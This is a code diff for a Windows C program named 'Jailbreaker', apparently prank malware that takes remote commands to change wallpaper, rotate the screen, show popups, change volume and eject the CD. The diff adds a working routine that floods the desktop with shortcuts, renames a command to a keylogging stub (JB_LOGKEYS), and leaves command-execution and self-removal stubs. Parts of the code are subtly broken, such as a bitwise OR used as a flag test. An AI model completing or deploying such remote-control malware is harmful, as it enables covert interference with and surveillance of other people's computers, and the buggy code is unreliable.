@@ -1,4 +1,5 @@
 #include "Funnies.h"
+#include "Link.h"
 
 WINBOOL changeWallpaper(char *path) {
     return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
@@ -15,7 +16,8 @@ LONG ChangeRotation(DWORD Orient) {
     DEVMODE mode;
 
     EnumDisplaySettings(NULL, ENUM_CURRENT_SETTINGS, &mode);
-    if (mode.dmFields | DM_DISPLAYORIENTATION) {
+    if (mode.dmFields | DM_DISPLAYORIENTATION) // DM_ORIENTATION ?
+    {
         mode.dmDisplayOrientation = Orient;
         return ChangeDisplaySettings(&mode, 0);
     }
@@ -28,7 +30,7 @@ void openLink(const char *url) {
 const char *PCName;
 static char wallpaper[MAX_PATH] = BADPATH;
 
-void sendError(const char *message) {
+void logErr(const char *message) {
     printf("ERROR: \"%s\"\n", message);
 }
 
@@ -36,10 +38,9 @@ void execCommand(JBCMD cmd)
 {
     // If strings are different then fail.
     if (strcmp(cmd.auth, PCName)) {
-        sendError("Auth failed.");
+        logErr("Auth failed.");
         return;
     }
-
 
     switch (cmd.cmd)
     {
@@ -48,16 +49,16 @@ void execCommand(JBCMD cmd)
         
         break;
     case JB_DEACTIVE:
-        sendError("Jailbreaker deactivated.");
+        log("Jailbreaker deactivated.");
         exit(0);
         break;
     case JB_REMOVE:
-
+        // you should uninstall yourself NOW!!!
         break;
 
     /* --- Sounds --- */
     case JB_VOLUME:
-        waveOutSetVolume(NULL, atoi(cmd.args));
+        waveOutSetVolume(NULL, atoi(cmd.args)); // deprecated
         break;
     case JB_SZAMBO:
         // path up to change
@@ -73,7 +74,7 @@ void execCommand(JBCMD cmd)
         break;
     case JB_LOADWALL:
         if (!strcmp(wallpaper, BADPATH)) {
-            sendError("No saved wallpaper");
+            logErr("No saved wallpaper");
             break;
         }
         
@@ -82,16 +83,27 @@ void execCommand(JBCMD cmd)
 
     /* --- Shortcuts --- */
     case JB_CREATELINKS:
+        char *arg1 = strtok(cmd.args, SEP);
+        if(!arg1) {
+            logErr("Not enougth arguments");
+            break;
+        }
+
+        char *arg2 = strtok(NULL, SEP);
+        if(!arg2)
+            arg2 = "100"; // default 100 icons
+
+        CreateLinks(arg1, atoi(arg2));
 
         break;
     case JB_REMOVELINKS:
 
         break;
+
+    /* --- Other --- */
     case JB_OPENWEB:
 
         break;
-
-    /* --- Other --- */
     case JB_CDEJECT:
 
         break;
@@ -102,7 +114,7 @@ void execCommand(JBCMD cmd)
         //MultiByteToWideChar(CP_ACP, MB_COMPOSITE, cmd.args, CMD_ARGSZ, wideBuffer, CMD_ARGSZ * 2)
         char *arg1 = strtok(cmd.args, SEP);
         if(!arg1) {
-            sendError("Not enought arguments");
+            logErr("Not enought arguments");
             break;
         }
 
@@ -123,23 +135,32 @@ void execCommand(JBCMD cmd)
     */
     case JB_POPUPA:
         char *arg1 = strtok(cmd.args, SEP);
+        if(!arg1) {
+            logErr("Not enougth arguments");
+            break;
+        }
+
         char *arg2 = strtok(NULL, SEP);
+        if(!arg2)
+            arg2 = "JB"; // default message title
+
         MessageBoxA(NULL, arg1, arg2, 0);
         break;
     case JB_EXEC:
 
         break;
     case JB_ROTATESCR:
+
         break;
     case JB_CHANGERES:
 
         break;
-    case JB_SENDKEY:
+    case JB_LOGKEYS:
 
         break;
 
     default:
-        sendError("Unknown command");
+        logErr("Unknown command");
         break;
     }
 }
